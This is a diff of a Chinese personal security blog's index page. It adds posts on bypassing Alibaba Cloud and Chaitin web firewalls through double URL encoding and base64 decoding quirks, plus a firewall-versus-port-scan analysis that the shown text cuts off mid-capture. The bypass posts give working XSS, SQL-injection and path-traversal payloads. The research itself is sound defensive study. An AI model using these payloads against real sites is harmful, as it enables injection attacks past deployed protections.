@@ -177,12 +177,12 @@
       <div class="site-state-item site-state-posts">
           <a href="/archives/">
         
-          <span class="site-state-item-count">18</span>
+          <span class="site-state-item-count">22</span>
           <span class="site-state-item-name">日志</span>
         </a>
       </div>
       <div class="site-state-item site-state-tags">
-        <span class="site-state-item-count">13</span>
+        <span class="site-state-item-count">15</span>
         <span class="site-state-item-name">标签</span>
       </div>
   </nav>
@@ -228,6 +228,691 @@
   
 
   <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2021-06-09-%E4%BD%A0%E7%9A%84%E6%89%AB%E6%8F%8F%E5%99%A8%E5%8F%AF%E4%BB%A5%E7%BB%95%E8%BF%87%E9%98%B2%E7%81%AB%E5%A2%99%E4%B9%88%EF%BC%88%E4%BA%8C%EF%BC%89/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="leveryd">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="leveryd的个人博客">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          <a href="/2021-06-09-%E4%BD%A0%E7%9A%84%E6%89%AB%E6%8F%8F%E5%99%A8%E5%8F%AF%E4%BB%A5%E7%BB%95%E8%BF%87%E9%98%B2%E7%81%AB%E5%A2%99%E4%B9%88%EF%BC%88%E4%BA%8C%EF%BC%89/" class="post-title-link" itemprop="url">你的扫描器可以绕过防火墙么（二）</a>
+        </h2>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">发表于</span>
+
+      <time title="创建时间：2021-06-09 23:51:53" itemprop="dateCreated datePublished" datetime="2021-06-09T23:51:53+08:00">2021-06-09</time>
+    </span>
+      <span class="post-meta-item">
+        <span class="post-meta-item-icon">
+          <i class="far fa-calendar-check"></i>
+        </span>
+        <span class="post-meta-item-text">更新于</span>
+        <time title="修改时间：2021-06-10 10:07:22" itemprop="dateModified" datetime="2021-06-10T10:07:22+08:00">2021-06-10</time>
+      </span>
+
+  
+</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+          <h1 id="背景"><a href="#背景" class="headerlink" title="背景"></a>背景</h1><p>看了<a target="_blank" rel="noopener" href="https://mp.weixin.qq.com/s/P5h9_K4YcvsrU4tsdHsJdQ">你的扫描器可以绕过防火墙么？（一）</a>的可能会觉得文章中用base64绕过场景有限。这篇文章介绍一种绕过场景更多一点的方法。</p>
+<p>用过商业waf产品的应该都知道，waf一般都会支持多种解码类型，比如base64、url、unicode等。</p>
+<p>所以<code>Li4vLi4vLi4vZXRjL3Bhc3N3ZA==</code>(“../../../etc/passwd”的base64编码)这种payload，会被waf解码后拦截。</p>
+<p>这里存在一个设计问题：如果waf只检测解码后的数据，不检测原始数据，就会存在一种通用绕过，很多web防护都有可能失效。</p>
+<p>我研究了下面的问题：</p>
+<ul>
+<li>怎么验证waf是否”只检测解码后的数据，不检测原始数据”？</li>
+<li>哪些waf存在这种绕过风险？</li>
+<li>怎么利用？</li>
+</ul>
+<h1 id="分析过程"><a href="#分析过程" class="headerlink" title="分析过程"></a>分析过程</h1><ul>
+<li><p>怎么验证？</p>
+<p>构造满足下面条件的数据：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">* 如果waf没有解码模块，此数据就应该被拦截</span><br><span class="line">* 如果waf有解码模块，解码后，此数据不应该被拦截</span><br></pre></td></tr></table></figure>
+
+<p>如果这个数据经过waf没有被拦截，就说明 存在风险。</p>
+<p>比如，如果有一个waf面对如下的测试payload</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;script a&#x3D;&quot;&quot;&gt;alert(1) &#x2F;&#x2F; 被waf拦截</span><br><span class="line">&lt;script a&#x3D;&quot;&quot;&gt;&lt;&#x2F;script&gt;&lt;x a&#x3D;&quot;&gt;alert(1) &#x2F;&#x2F; 不被waf拦截</span><br></pre></td></tr></table></figure>
+<p>其中第二个payload是通过”在第一个payload双引号中添加数据”构造出来的</p>
+<p>就可以构造出下面的”最终payload”：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script a&#x3D;&quot;%25%32%32%25%33%65%25%33%63%25%32%66%25%37%33%25%36%33%25%37%32%25%36%39%25%37%30%25%37%34%25%33%65%25%33%63%25%37%38%25%32%30%25%36%31%25%33%64&quot;&gt;alert(1)</span><br></pre></td></tr></table></figure>
+
+<p>如果”此waf只检测解码后的数据，不检测原始数据”，就不会拦截”最终payload”</p>
+</li>
+<li><p>验证阿里云waf</p>
+<p>以下是阿里云waf实际拦截结果</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">a&#x3D;&lt;svg onload&#x3D;&#39;xxxx&#x3D;&quot;x alert&quot;&#39;&gt;  拦截</span><br><span class="line">a&#x3D;&lt;svg onload&#x3D;&#39;xxxx&#x3D;&quot;x&quot;&gt; alert&quot;&#39;&gt;  不拦截</span><br></pre></td></tr></table></figure>
+
+<p>所以可以构造出下面的payload并验证</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">a&#x3D;&lt;svg onload&#x3D;&#39;xxxx&#x3D;&quot;x%25%32%32%25%33%65 alert&quot;&#39;&gt;  没有拦截</span><br></pre></td></tr></table></figure>
+
+<p>所以，阿里云waf确实存在风险，用<code>a=&lt;svg onload=&#39;xxxx=&quot;x%25%32%32%25%33%65&quot;; alert(1);&#39;&gt;</code>payload就可以绕过</p>
+</li>
+<li><p>验证长亭waf</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">a&#x3D;alert(&quot;111&quot;)  中危</span><br><span class="line">a&#x3D;alert(&quot;111&quot;&quot;) 正常</span><br></pre></td></tr></table></figure>
+
+<p>所以可以构造出下面的payload并验证</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">a&#x3D;alert(&quot;111%25%32%32&quot;)   中危</span><br></pre></td></tr></table></figure>
+
+<p>所以，长亭waf不存在此风险</p>
+</li>
+<li><p>怎么利用？</p>
+<p>如果waf存在此风险，就有可能导致非常多的web防护失效。</p>
+<p>构造payload的过程如同上面”怎么验证”的过程。</p>
+<p>下面再补充一个同样方式绕过阿里云sql注入防护的案例：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">a&#x3D;union&#x2F;*anything*&#x2F;select &quot;111&quot;  拦截</span><br><span class="line">a&#x3D;union&#x2F;**&#x2F;*&#x2F; select &quot;111&quot;  未拦截，但是此payload不是有效的</span><br><span class="line"></span><br><span class="line">因此可以得到下面 不拦截、且有效的 payload</span><br><span class="line">a&#x3D;union&#x2F;*%25%32%61%25%32%66*&#x2F;select &quot;111&quot;  未拦截，且payload有效</span><br></pre></td></tr></table></figure>
+
+</li>
+</ul>
+<h1 id="最后给自己的公众号打下广告"><a href="#最后给自己的公众号打下广告" class="headerlink" title="最后给自己的公众号打下广告"></a>最后给自己的公众号打下广告</h1><p>我在内部安全保障、安全产品两个方向有一些工作经验；在启明、百度等大厂也都呆过，也曾在房多多和安全团队一起做过从0到1的安全建设；在漏洞挖掘这一块虽然不是经验丰富，但之前也给”华为、阿里、360、百度、字节”等国内的大厂提交过一些高危严重漏洞（PS：并不代表我觉得这些src都非常好）；</p>
+<p>我后面会持续写 “安全产品”、”后端开发”、”有意思的安全问题/漏洞”，如果读者有什么想一起讨论的”题材”，欢迎在公众号后台留言；</p>
+<p>目前公众号一篇文章阅读量只有50-70，感觉太惨淡了。如果读者觉得我的文章有帮助，就希望能在公众号”点赞、在看、分享”，”点赞”和”在看”似乎也能增加一些曝光量。要不然文章就只能关注的人才能看得到。</p>
+
+      
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+        <div class="post-eof"></div>
+      
+    </footer>
+  </article>
+</div>
+
+
+
+
+    
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2021-06-07-%E4%BD%A0%E7%9A%84%E6%89%AB%E6%8F%8F%E5%99%A8%E5%8F%AF%E4%BB%A5%E7%BB%95%E8%BF%87%E9%98%B2%E7%81%AB%E5%A2%99%E4%B9%88%EF%BC%88%E4%B8%80%EF%BC%89/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="leveryd">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="leveryd的个人博客">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          <a href="/2021-06-07-%E4%BD%A0%E7%9A%84%E6%89%AB%E6%8F%8F%E5%99%A8%E5%8F%AF%E4%BB%A5%E7%BB%95%E8%BF%87%E9%98%B2%E7%81%AB%E5%A2%99%E4%B9%88%EF%BC%88%E4%B8%80%EF%BC%89/" class="post-title-link" itemprop="url">你的扫描器可以绕过防火墙么（一）</a>
+        </h2>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">发表于</span>
+
+      <time title="创建时间：2021-06-07 20:57:26" itemprop="dateCreated datePublished" datetime="2021-06-07T20:57:26+08:00">2021-06-07</time>
+    </span>
+      <span class="post-meta-item">
+        <span class="post-meta-item-icon">
+          <i class="far fa-calendar-check"></i>
+        </span>
+        <span class="post-meta-item-text">更新于</span>
+        <time title="修改时间：2021-06-10 10:07:27" itemprop="dateModified" datetime="2021-06-10T10:07:27+08:00">2021-06-10</time>
+      </span>
+
+  
+</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+          <h1 id="背景"><a href="#背景" class="headerlink" title="背景"></a>背景</h1><p>看过<a target="_blank" rel="noopener" href="https://mp.weixin.qq.com/s/qF7Jgiev5B7zLEHwGXry3A">从shiro-550漏洞品阿里云waf规则引擎</a>文章的，应该知道阿里云是怎么防护shiro反序列化漏洞的利用，那么我们有办法绕过防护么？</p>
+<p>先把上面的问题放一放，看看几个base64解码相关的case吧。</p>
+<p>base64解码时，不同语言的接口实现有略微区别，目前知道有两种”边界情况”：</p>
+<ul>
+<li>字符串中包含 <code>. %</code>  等符号时，是选择忽略这些符号，还是报错</li>
+<li>字符串中包含 <code>=</code> 符号，解析到<code>=</code>时，是认为解析完成了，还是忽略”等号”继续解析</li>
+</ul>
+<p>比如：<br>Python base64解码时，会忽略”=”号后面的字符串</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">import binascii</span><br><span class="line">binascii.a2b_base64(b&#39;aGVsbG8&#x3D;&#39;)       # b&#39;hello&#39; (valid)</span><br><span class="line">binascii.a2b_base64(b&#39;aGVsbG8&#x3D;&#x3D;&#39;)      # b&#39;hello&#39; (ignoring data)</span><br><span class="line">binascii.a2b_base64(b&#39;aGVsbG8&#x3D;python&#39;) # b&#39;hello&#39; (ignoring data)</span><br></pre></td></tr></table></figure>
+
+<p>PHP base64解码时，支持编码中有<code>. %</code>  等符号，会忽略这些符号</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">P.HNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg&#x3D;&#x3D;</span><br><span class="line">P%HNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg&#x3D;&#x3D;</span><br></pre></td></tr></table></figure>
+
+<p>我也是从别人给Python提交的<a target="_blank" rel="noopener" href="https://bugs.python.org/issue43086">这个bug</a> 学到的一些姿势。</p>
+<p>所以，我想研究以下问题：</p>
+<ul>
+<li>哪些语言受影响？</li>
+<li>会有什么影响？<ul>
+<li>什么时候会产生绕过？</li>
+<li>哪些waf可以绕过？</li>
+</ul>
+</li>
+</ul>
+<h1 id="哪些语言受影响？"><a href="#哪些语言受影响？" class="headerlink" title="哪些语言受影响？"></a>哪些语言受影响？</h1><ul>
+<li><p>测试思路</p>
+<p>有两个两个测试目标：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">1. 看看&quot;不同语言 对 &#x3D;&#x3D; 后面是否忽略&quot;</span><br><span class="line">2. 看看&quot;不同语言 对 . 号是否忽略&quot;</span><br></pre></td></tr></table></figure>
+
+<p>因此，对<code>hello</code>base64编码并做点变形，得到下面三个测试paylaod</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">aGVsbG8&#x3D;test</span><br><span class="line">aGVs.bG8</span><br><span class="line">aGVs.bG8&#x3D;</span><br></pre></td></tr></table></figure>
+
+<p>另外额外测一下shiro中base64的解码</p>
+</li>
+<li><p>测试的语言、版本、解码接口如下</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">php(7.3.11): base64_decode</span><br><span class="line"></span><br><span class="line">python(3.7): binascii.a2b_base64、base64.b64decode</span><br><span class="line"></span><br><span class="line">openresty(1.19): ngx.base64.decode_base64url</span><br><span class="line"></span><br><span class="line">java(jshell 14.0.1): Base64.getDecoder().decode</span><br><span class="line"></span><br><span class="line">shiro(1.5.1): org.apache.shiro.codec.Base64.decode</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>测试结果</p>
+<table>
+<thead>
+<tr>
+<th>payload</th>
+<th>php</th>
+<th>python</th>
+<th>openresty</th>
+<th>java</th>
+<th>shiro</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><code>aGVsbG8=test</code></td>
+<td>hello-z�</td>
+<td>hello</td>
+<td>hello</td>
+<td>抛异常</td>
+<td>hello-z�</td>
+</tr>
+<tr>
+<td><code>aGVs.bG8</code></td>
+<td>hello</td>
+<td>解码失败</td>
+<td>解码失败</td>
+<td>抛异常</td>
+<td>hel</td>
+</tr>
+<tr>
+<td><code>aGVs.bG8=</code></td>
+<td>hello</td>
+<td>hello</td>
+<td>解码失败</td>
+<td>抛异常</td>
+<td>hello</td>
+</tr>
+<tr>
+<td><code>aGVsbG8=</code></td>
+<td>hello</td>
+<td>hello</td>
+<td>hello</td>
+<td>hello</td>
+<td>hello</td>
+</tr>
+</tbody></table>
+</li>
+<li><p>结论</p>
+<ul>
+<li>php、python、openresty、shiro 都不同程度地受变形payload影响</li>
+</ul>
+</li>
+</ul>
+<h1 id="会有什么影响？"><a href="#会有什么影响？" class="headerlink" title="会有什么影响？"></a>会有什么影响？</h1><ul>
+<li><p>什么时候适用这种绕过方式？</p>
+<p>以下情况下会存在绕过：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">1. waf不能解码，后端可以解码</span><br><span class="line">2. waf解码后，只检测解码后的数据，不检测原始payload</span><br></pre></td></tr></table></figure>
+
+<p>第一种情况的例子：比如发送 <code>PHN.jcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==</code>，如果waf不能解码，就会放行。</p>
+<p>第二种情况的例子：发送<code>a=aGVsbG8=&#39; union select 1 and &#39;</code>，有可能waf解码成 “hello”，认为没有危害，也会放行</p>
+<p>第一种情况很常见，第二种情况目前还没有遇到案例。</p>
+</li>
+<li><p>哪些waf可以绕过？</p>
+<p>只测试了我心中的”最强王者”(阿里云waf和长亭云waf)，都存在第一种情况的绕过。</p>
+</li>
+</ul>
+<h1 id="规范"><a href="#规范" class="headerlink" title="规范"></a>规范</h1><ul>
+<li><p>规范中是怎么定义”base64解码时对非字母如何处理”？</p>
+<p><a target="_blank" rel="noopener" href="https://datatracker.ietf.org/doc/html/rfc4648#section-3.3">rfc规范</a> 中说的是，”没有特殊情况下，遇到非字母就应该报错并拒绝继续解码”。</p>
+<p>看<a target="_blank" rel="noopener" href="https://shiro.apache.org/static/1.3.0/apidocs/org/apache/shiro/codec/Base64.html">官方文档</a> shiro 是根据另外一个<a target="_blank" rel="noopener" href="https://www.ietf.org/rfc/rfc2045.txt">邮件相关的规范</a>来做的base64编解码。</p>
+</li>
+</ul>
+<h1 id="最后"><a href="#最后" class="headerlink" title="最后"></a>最后</h1><p>所以，现在你清楚怎么绕过shiro漏洞的防护了么？</p>
+<p>另外，如果读者有第二种情况绕过的案例，欢迎公众号后台私信我。</p>
+
+      
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+        <div class="post-eof"></div>
+      
+    </footer>
+  </article>
+</div>
+
+
+
+
+    
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2021-05-26-%E5%BD%93%E7%AB%AF%E5%8F%A3%E6%89%AB%E6%8F%8F%E9%81%87%E5%88%B0%E9%98%B2%E7%81%AB%E5%A2%99/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="leveryd">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="leveryd的个人博客">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          <a href="/2021-05-26-%E5%BD%93%E7%AB%AF%E5%8F%A3%E6%89%AB%E6%8F%8F%E9%81%87%E5%88%B0%E9%98%B2%E7%81%AB%E5%A2%99/" class="post-title-link" itemprop="url">当端口扫描遇到防火墙</a>
+        </h2>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">发表于</span>
+
+      <time title="创建时间：2021-05-26 13:13:44" itemprop="dateCreated datePublished" datetime="2021-05-26T13:13:44+08:00">2021-05-26</time>
+    </span>
+      <span class="post-meta-item">
+        <span class="post-meta-item-icon">
+          <i class="far fa-calendar-check"></i>
+        </span>
+        <span class="post-meta-item-text">更新于</span>
+        <time title="修改时间：2021-06-03 19:24:02" itemprop="dateModified" datetime="2021-06-03T19:24:02+08:00">2021-06-03</time>
+      </span>
+
+  
+</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+          <h1 id="问题背景"><a href="#问题背景" class="headerlink" title="问题背景"></a>问题背景</h1><p>在<a target="_blank" rel="noopener" href="https://mp.weixin.qq.com/s/yLtUKN9fJrQD0P63Ghkv7w">为什么masscan扫描快(1)?</a> 里，我提到之前端口扫描时遇到过很严重的误报：”端口扫描结果中发现有的ip开放了5000+个端口，并且端口上似乎没有什么业务。”。</p>
+<p>写完上篇文章后，后台收到一个读者留言说他也遇到过这样的ip。ip是国外的一个垃圾站点，下文中我以”x.x.x.x”代替这个ip。</p>
+<p>“x.x.x.x”使用<code>masscan x.x.x.x -p 1-65535 --rate 4000</code>时，结果中确实显示大量开放端口。</p>
+<p>为了验证这些端口是否真的开放，我使用<code>echo 111 | nc x.x.x.x 28328</code>命令验证(28328是masscan判定为开放的端口)，并同时tcpdump抓包，如下：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">[root@instance-fj5pftdp ~]# tcpdump &quot;host x.x.x.x&quot;</span><br><span class="line">...</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F; 第一次执行 echo 111 | nc  x.x.x.x 28328</span><br><span class="line">23:59:20.635538 IP instance-fj5pftdp.34796 &gt; x.x.x.x.11935: Flags [S], seq 1688099017, win 27200, options [mss 1360,sackOK,TS val 2944989102 ecr 0,nop,wscale 7], length 0</span><br><span class="line">23:59:20.670753 IP x.x.x.x.11935 &gt; instance-fj5pftdp.34796: Flags [S.], seq 3942687481, ack 1688099018, win 14600, options [mss 1460,nop,wscale 7,nop,nop,sackOK], length 0</span><br><span class="line">23:59:20.670859 IP instance-fj5pftdp.34796 &gt; x.x.x.x.11935: Flags [.], ack 1, win 213, length 0</span><br><span class="line">23:59:20.671028 IP instance-fj5pftdp.34796 &gt; x.x.x.x.11935: Flags [P.], seq 1:5, ack 1, win 213, length 4</span><br><span class="line">23:59:20.671044 IP instance-fj5pftdp.34796 &gt; x.x.x.x.11935: Flags [F.], seq 5, ack 1, win 213, length 0</span><br><span class="line">23:59:20.709843 IP x.x.x.x &gt; instance-fj5pftdp: ICMP host x.x.x.x unreachable - admin prohibited, length 60</span><br><span class="line">23:59:20.742398 IP instance-fj5pftdp.34796 &gt; x.x.x.x.11935: Flags [F.], seq 5, ack 1, win 213, length 0</span><br><span class="line">23:59:20.978400 IP instance-fj5pftdp.34796 &gt; x.x.x.x.11935: Flags [FP.], seq 1:5, ack 1, win 213, length 4</span><br><span class="line">23:59:21.451408 IP instance-fj5pftdp.34796 &gt; x.x.x.x.11935: Flags [FP.], seq 1:5, ack 1, win 213, length 4</span><br><span class="line">23:59:22.397413 IP instance-fj5pftdp.34796 &gt; x.x.x.x.11935: Flags [FP.], seq 1:5, ack 1, win 213, length 4</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F; 第二次执行 echo 111 | nc  x.x.x.x 28328</span><br><span class="line">00:05:02.133562 IP instance-fj5pftdp.36738 &gt; x.x.x.x.11935: Flags [S], seq 3374266173, win 27200, options [mss 1360,sackOK,TS val 2945330600 ecr 0,nop,wscale 7], length 0</span><br><span class="line">00:05:02.168661 IP x.x.x.x &gt; instance-fj5pftdp: ICMP host x.x.x.x unreachable - admin prohibited, length 68</span><br></pre></td></tr></table></figure>
+
+<p>从数据包中可以看到一个奇怪的现象：</p>
+<ul>
+<li>第一次执行命令时，服务端第一次返回syn-ack,第二次返回icmp不可达。</li>
+<li>第二次执行命令时，服务端直接返回icmp不可达。</li>
+<li>实际上第三次、第四次执行命令时，服务端也是直接返回icmp不可达。</li>
+</ul>
+<p>另外多测试几次，有一个更奇怪的现象：</p>
+<ul>
+<li>扫描结果不稳定：有时显示大量端口开放、有时显示一个不固定的端口开放（比如44736）</li>
+</ul>
+<p>因此我想搞清楚以下问题：</p>
+<ul>
+<li>为啥会出现两个上面奇怪的现象？<ul>
+<li>是否存在防火墙？</li>
+<li>防火墙的防护策略是啥？</li>
+</ul>
+</li>
+<li>怎么规避这种防火墙获取正确的端口信息？</li>
+</ul>
+<p>首先有三个非常肯定的前提：</p>
+<ul>
+<li>目标机器28328、44736等端口肯定是没有tcp监听的，只有80、22、3306等端口开放</li>
+<li>目标机器上用了firewalld，且是默认防护策略</li>
+<li>因为返回了syn-ack，所以syn扫描才误判成端口开放</li>
+</ul>
+<h1 id="什么是防火墙？"><a href="#什么是防火墙？" class="headerlink" title="什么是防火墙？"></a>什么是防火墙？</h1><p>  按照防火墙的位置，防火墙可以划分成：</p>
+<ul>
+<li><p>主机防火墙：运行在服务器上</p>
+</li>
+<li><p>硬件设备：串联或者旁路部署</p>
+<p>系统自带的主机防火墙包括：</p>
+</li>
+<li><p>iptables</p>
+</li>
+<li><p>firewalld</p>
+</li>
+<li><p>tcp wrappers</p>
+<p>这次目标主机上就运行着firewalld，当访问不存在的端口时，它会返回icmp包。</p>
+<p>除了系统自带的防火墙，很多甲方会基于snort、bro、suricata、ossec等开源项目做入侵检测系统。</p>
+<p>除了这些，各家乙方的ips、ddos等防护设备都有可能在存在。</p>
+<p>按照是否支持状态跟踪，防火墙可以划分成：</p>
+</li>
+<li><p>有状态防火墙</p>
+</li>
+<li><p>无状态防火墙（也叫”包过滤防火墙”）</p>
+<p>按照在osi七层模型的位置，防火墙也可以划分成：</p>
+</li>
+<li><p>四层防火墙</p>
+</li>
+<li><p>七层防火墙（主要是waf产品）</p>
+</li>
+</ul>
+<h1 id="先总结这次遇到的防火墙策略"><a href="#先总结这次遇到的防火墙策略" class="headerlink" title="先总结这次遇到的防火墙策略"></a>先总结这次遇到的防火墙策略</h1><p>小结：</p>
+<ul>
+<li><p>整条链路存在两个防火墙：</p>
+<ul>
+<li>一个是主机上的firewalld，默认策略</li>
+<li>另一个应该是部署在机房中</li>
+</ul>
+</li>
+<li><p>主机的firewalld防火墙，有如下特征：</p>
+<ul>
+<li>收到syn包，目的端口不存在时会返回icmp包</li>
+</ul>
+</li>
+<li><p>机房的防火墙可能是一台防ddos设备，有如下特征：</p>
+<ul>
+<li><p>不是rst方式、首包丢弃等方式的防火墙；也不是基于”陷阱端口”</p>
+</li>
+<li><p>当频率到达阈值时，会开启”源认证”</p>
+</li>
+<li><p>通过”源认证”会暂时加白；如果频率再次触发阈值，就会再次开启”源认证”</p>
+</li>
+<li><p>有ip拉黑机制，被拉黑后，一段时间内客户端发出的syn、ack包不会收到任何回包</p>
+</li>
+<li><p>不拦截长度大于0的udp包</p>
+</li>
+</ul>
+</li>
+</ul>
+<h1 id="分析过程"><a href="#分析过程" class="headerlink" title="分析过程"></a>分析过程</h1><ul>
+<li><p>判断是否存在防火墙？</p>
+<p>现象一：</p>
+<p><code>nc x.x.x.x 不存在的端口</code>时，响应icmp包。</p>
+<p>基于如下两个原因可以推断出存在防火墙</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">* 一般来说，向操作系统不存在的端口发送tcp syn包时，会收到操作系统的rst包</span><br><span class="line">* 似乎只有防火墙喜欢返回icmp包</span><br></pre></td></tr></table></figure>
+
+<p>现象二：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">nmap工具扫描前：可以ping通，curl 80可以访问</span><br><span class="line"></span><br><span class="line">nmap工具扫描后，ping和curl都无法访问</span><br><span class="line"></span><br><span class="line">过一段时间后：又可以ping通，curl 80也可以访问</span><br></pre></td></tr></table></figure>
+
+<p>说明防火墙有黑名单机制。</p>
+<p>结论：确认存在防火墙，且有黑名单ip机制</p>
+</li>
+<li><p>判断防火墙是否有”握手时rst”、首包丢弃等行为</p>
+<p>思路：<br>连接提供tcp服务的端口并抓包，查看是否有rst，首包丢弃等行为</p>
+<p>过程：</p>
+<p>执行<code>echo | nc x.x.x.x 80</code>，并抓包</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">[root@instance-fj5pftdp ~]# tcpdump -i eth0 &#39;host  x.x.x.x&#39;</span><br><span class="line">...</span><br><span class="line">18:15:53.547200 IP instance-fj5pftdp.51400 &gt; x.x.x.x.http: Flags [S], seq 468920486, win 27200, options [mss 1360,sackOK,TS val 2405982013 ecr 0,nop,wscale 7], length 0</span><br><span class="line">18:15:53.579860 IP x.x.x.x.http &gt; instance-fj5pftdp.51400: Flags [S.], seq 3601120884, ack 468920487, win 14480, options [mss 1460,sackOK,TS val 556123394 ecr 2405982013,nop,wscale 7], length 0</span><br><span class="line">18:15:53.579943 IP instance-fj5pftdp.51400 &gt; x.x.x.x.http: Flags [.], ack 1, win 213, options [nop,nop,TS val 2405982046 ecr 556123394], length 0</span><br><span class="line">18:15:53.580084 IP instance-fj5pftdp.51400 &gt; x.x.x.x.http: Flags [P.], seq 1:2, ack 1, win 213, options [nop,nop,TS val 2405982046 ecr 556123394], length 1: HTTP</span><br><span class="line">18:15:53.580097 IP instance-fj5pftdp.51400 &gt; x.x.x.x.http: Flags [F.], seq 2, ack 1, win 213, options [nop,nop,TS val 2405982046 ecr 556123394], length 0</span><br><span class="line">18:15:53.611613 IP x.x.x.x.http &gt; instance-fj5pftdp.51400: Flags [.], ack 2, win 114, options [nop,nop,TS val 556123427 ecr 2405982046], length 0</span><br><span class="line">18:15:53.611895 IP x.x.x.x.http &gt; 